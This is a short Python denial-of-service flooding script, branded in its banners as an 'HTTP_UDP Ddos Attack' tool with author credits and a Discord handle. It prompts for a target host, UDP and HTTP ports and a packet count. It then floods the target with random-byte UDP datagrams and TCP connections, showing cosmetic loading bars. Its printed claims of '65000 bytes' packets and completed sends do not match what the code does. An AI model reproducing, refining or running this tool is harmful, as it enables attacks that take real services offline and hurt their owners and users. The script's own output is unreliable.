# -*- coding: utf-8 -*-
#!/usr/bin/env python 3
import os
import sys
import time
import socket
import random

print ("█████████████████████████████████")
print ("!-------------------------------!")
print ("!    9ggmy by Lotus             !")
print ("!    Discord: Myuu#4057         !")
print ("!    Example: thedomain.com    !")
print ("!    Don'n use Https or Http    !")
print ("!    Enter Ctrl + C for Stop    !")
print ("!-------------------------------!")

if os.name in ('nt', 'dos', 'ce'):
   os.system('title       ........::::: Code By Thunder(P3terJ4mes),HTTP_UDP Ddos Attack :::::........')
   os.system('color 0A')

try:    
   url  = input("Host : ")
   host = url.replace("http://", "").replace("https://", "").split('/')[0]
   ip = socket.gethostbyname(host)
   udpport = int(input("Port(UDP) : "))
   httpport = int(input("Port(HTTP) : "))
   sent = int(input("Thread : "))
   print("Loading Packet ...........")
   print("UDP Ip Host: "+ str(ip)+":"+ str(udpport))
   print("HTTP Ip Host: "+ str(ip)+":"+ str(httpport))
   time.sleep(1)
   print ("Loading [                             ] 0% ")
   time.sleep(1)
   print ("Loading [=======                      ] 25%")
   time.sleep(0.75)
   print ("Loading [==============               ] 50%")
   time.sleep(0.5)
   print ("Loading [========================     ] 75%")
   time.sleep(0.25)
   print ("Loading [=============================] 100%")
   time.sleep(0)
   print("Loading HTTP-UDP Packets............. ")
   print("===============================>>>>>>>")
   print("Sent %s packet to IP-[%s:%s] whit 65000 bytes Host-[%s]-"%(sent,ip,udpport,host))
   print("Sent %s packet to IP-[%s:%s] whit 65000 bytes Host-[%s]-"%(sent,ip,httpport,host))
   print("")
except:
   print("Enter The Host Again , Cant Scan Host !!!")
   
def progressbar(it, prefix = '', size = 60):
    count = len(it)
    
    def _show(_i):
        x = int(size * _i / count)
        sys.stdout.write('%s[|%s%s|] %i/%i\r' % (prefix, '█' * x, '_' * (size - x), _i, count))
        sys.stdout.flush()
        
    _show(0)
    for (i, item) in enumerate(it):
        yield item
        (None, None, None)
        _show(i + 1)
    
    sys.stdout.write('\n')
    sys.stdout.flush()

def UDPSocker():
    try:
        socks =  socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(2048)
        socks.sendto(bytes,(ip,udpport))
    except KeyboardInterrupt:
        exit("[============================>>> UDPSocker Canceled By P3terJ4mes !!!")


def HTTPSocker():
    try:
        socks =  socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        bytes = random._urandom(2048)
        socks.connect((ip,httpport))
        socks.send(bytes)
    except KeyboardInterrupt:
        exit("[============================>>> HTTPSocker Canceled By P3terJ4mes !!!")

for i in progressbar(range(sent), 'Loading UDPSocks: ',40):
    UDPSocker()
    
for i in progressbar(range(sent), 'Loading HTTPSocks: ',40):
    HTTPSocker()
          
print ("---->>>The connections you requested had finished !!!!")
print ("+----------------------------------------------------+")
time.sleep(10)

